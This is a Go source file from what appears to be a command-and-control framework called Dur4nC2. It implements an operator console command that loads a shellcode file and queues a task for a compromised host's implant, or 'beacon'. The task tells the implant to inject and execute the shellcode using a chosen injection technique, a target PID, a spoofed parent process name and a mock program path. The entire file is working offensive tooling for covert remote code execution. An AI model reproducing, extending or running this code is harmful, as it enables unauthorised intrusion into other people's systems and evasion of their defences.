package exec

import (
	"Dur4nC2/misc/protobuf/clientpb"
	"Dur4nC2/misc/protobuf/commonpb"
	"Dur4nC2/misc/protobuf/implantpb"
	"Dur4nC2/server/console"
	"Dur4nC2/server/db"
	beaconRepository "Dur4nC2/server/domain/beacon/repository/postgres"
	"Dur4nC2/server/domain/models"
	taskRepository "Dur4nC2/server/domain/task/repository/postgres"
	"errors"
	"github.com/desertbit/grumble"
	"github.com/gofrs/uuid"
	"google.golang.org/protobuf/proto"
	"io/ioutil"
	"math/rand"
)

func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.ServerConsoleClient) error {
	beacon := con.ActiveTarget.GetBeacon()
	if beacon == nil {
		return errors.New("non active beacon")
	}
	filePath := ctx.Flags.String("file-path")
	processName := ctx.Flags.String("spoofed-process-name")
	programPath := ctx.Flags.String("program-path")
	description := ctx.Flags.String("description")
	method := ctx.Flags.String("method")
	pid := ctx.Flags.String("pid")

	beaconRepo := beaconRepository.NewPostgresBeaconRepository(db.Session())
	currentBeacon, err := beaconRepo.Read(uuid.FromStringOrNil(beacon.ID))
	if err != nil {
		return err
	}
	shellcode, err := ioutil.ReadFile(filePath)
	//fmt.Println(dllData)
	if err != nil {
		return err
	}
	err = executeShellcode(con, shellcode, beacon, currentBeacon, processName, programPath, pid, description, method)
	return err
}

func executeShellcode(
	con *console.ServerConsoleClient,
	shellcode []byte,
	beacon *clientpb.Beacon,
	currentBeacon models.Beacon,
	processName string,
	programPath string,
	pid string,
	description string,
	method string,
) error {
	request := &commonpb.Request{BeaconID: currentBeacon.ID.String()}
	executeShellcodeReq := &implantpb.ExecuteShellcodeReq{
		Shellcode:                shellcode,
		SpoofedParentProcessName: processName,
		MockProgramPath:          programPath,
		Request:                  request,
		InjectionTechnique:       method,
		Pid:                      pid,
	}
	data, _ := proto.Marshal(executeShellcodeReq)
	v := rand.Intn(999999999999999999-100000000000000000) + 100000000000000000
	taskReq := &implantpb.Envelope{
		ID:   int64(v),
		Type: implantpb.MsgExecuteShellcodeReq,
		Data: data,
	}
	taskReqData, _ := proto.Marshal(taskReq)

	newTask := models.BeaconTask{
		EnvelopeID:  int64(v),
		BeaconID:    uuid.FromStringOrNil(beacon.ID),
		Description: description,
		State:       models.PENDING,
		Request:     taskReqData,
	}
	taskRepo := taskRepository.NewPostgresBeaconTaskRepository(db.Session())
	err := taskRepo.Create(currentBeacon, newTask)
	if err != nil {
		return err
	}
	con.PrintInfof("Task successfully added to the queue, please wait the response...")
	return nil
}
